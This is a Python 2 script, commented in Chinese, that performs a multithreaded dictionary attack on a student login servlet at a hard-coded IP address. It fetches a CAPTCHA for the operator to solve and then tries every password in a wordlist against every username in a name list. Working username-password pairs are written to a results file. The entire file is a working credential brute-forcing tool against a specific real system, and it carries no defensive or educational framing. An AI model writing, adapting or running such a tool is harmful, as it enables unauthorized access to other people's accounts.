#encoding=utf-8
import urllib
import urllib2
import cookielib
import sys
import time
import threading

#cookie收集器
cj = cookielib.CookieJar()

#自定义异常类，分找到与未找到密码两种情况
class FoundException(Exception):
    pass

class NotFoundException(Exception):
    pass

#自定义HTTP重定向处理，只需检查头部信息即可判定是否登录成功
class MyHTTPRedirectHandler(urllib2.HTTPRedirectHandler):
    def http_error_302(self, req, fp, code, msg, headers):
        line = str(headers)
        if "tip.jsp" in line:
            raise NotFoundException
        raise FoundException

    http_error_301 = http_error_303 = http_error_307 = http_error_302

class Counter(object):
    def __init__(self, start=0):
        self.lock = threading.Lock()
        self.value = start

    def increment(self):
        self.lock.acquire()
        try:
            self.value = self.value+1
        finally:
            self.lock.release()
    
    def getnext(self):
        self.lock.acquire()
        try:
            self.value = self.value+1
        finally:
            self.lock.release()
        return self.value-1

#用于发送HTTP请求
opener = urllib2.build_opener(MyHTTPRedirectHandler,\
            urllib2.HTTPCookieProcessor(cj))

def progressBar(total, checked, founded, startT):
    print ' '+'['+'='*int(checked.value*50/total)+'>'+\
            ' '*(49-int(checked.value*50/total))+\
            ']'+ '%.2f%%'%(checked.value*100/total)+' %d Founded'%founded.value+\
            ' %.2f key/s'%(checked.value/(time.time()-startT))+'\r',
    sys.stdout.flush()

#提交表单
def postRequest(name):
    opener1 = urllib2.build_opener(MyHTTPRedirectHandler,\
                urllib2.HTTPCookieProcessor(cj))
    query_args = {
        'who':'student',
        'id':'',
        'pwd':'',
        'yzm':captcha,
        'submit':'%C8%B7+%B6%A8'
        }
    res = open('result', 'a')
    query_args['id'] = name
    for p in pwd:
        query_args['pwd'] = p
        encoded_args = urllib.urlencode(query_args)
        checked.increment()
        try:
            opener1.open('http://202.114.74.198/servlet/Login', encoded_args)
        except FoundException:
            founded.increment()
            progressBar(total, checked, founded, startT)
            res.write("\n"+query_args['id']+": "+query_args['pwd'])
            res.close()
            break
        except NotFoundException:
            continue
        finally:
            progressBar(total, checked, founded, startT)

def bruteMachine():
    postRequest(name[namep.getnext()])

#主程序
def main():
    
    image = open('captcha.jpg', 'wb')
    image.write(opener.open('http://202.114.74.198/GenImg').read())
    image.close()
    global captcha
    captcha = raw_input("The CAPTCHA:")
    
    global name
    name = [i.strip() for i in open('namelist', 'r')]
    global pwd
    pwd = [i.strip() for i in open('dictionary', 'r')]
    
    global total, checked, founded, startT, namep
    total = len(name)*len(pwd)
    checked = Counter(0.0)
    founded = Counter(0)
    namep = Counter(0)
    startT = time.time()
    threads = []
    for i in range(10):
        t = threading.Thread(target=bruteMachine)
        t.daemon = True
        t.start()
        threads.append(t)
    while True:
        time.sleep(1)
main()
